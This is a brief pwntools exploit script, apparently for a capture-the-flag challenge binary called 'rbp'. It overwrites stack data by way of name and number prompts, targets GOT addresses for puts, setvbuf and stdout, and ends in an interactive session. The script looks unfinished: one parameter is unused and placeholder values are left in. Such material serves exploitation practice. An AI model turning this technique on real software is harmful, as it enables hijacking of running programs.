#!/bin/python3

from pwn import *

MAIN = 0x4011d5
MAIN_AFTER_INIT = 0x4011d6
MAIN_BEFORE_INIT = 0x4011dd

STDOUT_ADDR = 0x404050
SETVBUF_ADDR = 0x404030
PUTS_ADDR = 0x404018

io = process('./rbp')

def move(next_write_loc, qword):
    payload = b''
    payload += p64(MAIN_BEFORE_INIT)
    payload += p64(0xdeadbeef)
    payload += p64(qword)

    io.sendafter(b'name? ', payload)

    input()
    io.sendafter(b'number? ', b'-' + str(0x28).encode())

move(STDOUT_ADDR, 0xdeadbeef)
move(0xdeadbeef, PUTS_ADDR)

io.interactive()
